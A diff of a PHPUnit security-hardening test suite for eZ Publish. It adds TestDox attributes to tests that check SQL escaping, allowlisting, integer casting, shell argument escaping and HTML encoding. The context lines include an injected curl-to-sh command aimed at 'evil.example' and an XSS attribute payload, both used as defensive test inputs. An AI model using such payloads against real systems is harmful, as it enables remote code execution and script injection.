@@ -54,6 +54,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-01 — SQL sort field with embedded single-quote is escaped
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-01 — SQL sort field with embedded single-quote is escaped')]
     public function testSec01SqlSortFieldEscapedBeforeQuery(): void
     {
         $db = $this->db();
@@ -81,6 +82,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-01 — NULL sort field is gracefully handled (no query injection)
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-01 — NULL sort field is gracefully handled (no query injection)')]
     public function testSec01NullSortFieldSkipped(): void
     {
         $sortField = null;
@@ -108,6 +110,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-02 — Sort order input restricted to allowlist (ASC/DESC)
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-02 — Sort order input restricted to allowlist (ASC/DESC)')]
     public function testSec02SortOrderRestrictedToAllowlist(): void
     {
         $allowlist = [ 'ASC', 'DESC' ];
@@ -135,6 +138,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-02 — Integer sort field input is cast to int before SQL use
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-02 — Integer sort field input is cast to int before SQL use')]
     public function testSec02SortFieldCastToInt(): void
     {
         // Simulate the patch: (int) cast prevents string injection in numeric context
@@ -160,6 +164,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-03 — User search filter string is escaped via escapeString
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-03 — User search filter string is escaped via escapeString')]
     public function testSec03UserSearchFilterEscaped(): void
     {
         $db      = $this->db();
@@ -183,6 +188,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-03 — Empty filter string is handled without SQL syntax error
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-03 — Empty filter string is handled without SQL syntax error')]
     public function testSec03EmptyFilterHandledSafely(): void
     {
         $filter = '';
@@ -204,6 +210,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-04 — Related content object IDs are cast to int array
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-04 — Related content object IDs are cast to int array')]
     public function testSec04RelatedObjectIdsCastToInt(): void
     {
         // Simulate: user-supplied content-object-id list from query string
@@ -233,6 +240,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-05 — Executable path that contains shell metacharacters is rejected
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-05 — Executable path that contains shell metacharacters is rejected')]
     public function testSec05ShellExecutablePathRejectsMetacharacters(): void
     {
         // The patch validates executable path with a strict regex or escapeshellcmd()
@@ -260,6 +268,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-05 — Arguments passed to shell handler are individually escaped
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-05 — Arguments passed to shell handler are individually escaped')]
     public function testSec05ShellArgumentsEscaped(): void
     {
         $malicious = '-resize 800x600$(curl http://evil.example/payload.sh|sh)';
@@ -286,6 +295,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-06 — ClipImage dimensions are validated as positive integers
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-06 — ClipImage dimensions are validated as positive integers')]
     public function testSec06ClipImageDimensionsArePositiveIntegers(): void
     {
         $allowedDimensions = [
@@ -342,6 +352,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-07 — PHP code string with <script> tag is HTML-encoded for output
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-07 — PHP code string with <script> tag is HTML-encoded for output')]
     public function testSec07PhpOperatorOutputHtmlEncoded(): void
     {
         // Simulate the patch: htmlspecialchars() applied before echo in template operator
@@ -363,6 +374,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox SEC-07 — Operator output with double-quote in attribute context is safe
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('SEC-07 — Operator output with double-quote in attribute context is safe')]
     public function testSec07DoubleQuoteInAttributeContextEncoded(): void
     {
         $payload = '" onmouseover="alert(1)';
@@ -385,6 +397,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox Null inputs that previously caused PHP notices are handled by empty checks
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('Null inputs that previously caused PHP notices are handled by empty checks')]
     public function testNullInputsHandledByEmptyChecks(): void
     {
         // Simulate the type of null-check patch applied across multiple files
@@ -403,6 +416,7 @@ class eZSecurityHardeningTest extends PHPUnit\Framework\TestCase
     /**
      * @testdox escapeString on all major injection payloads modifies the string
      */
+    #[\PHPUnit\Framework\Attributes\TestDox('escapeString on all major injection payloads modifies the string')]
     public function testEscapeStringModifiesAllPayloads(): void
     {
         $db = $this->db();
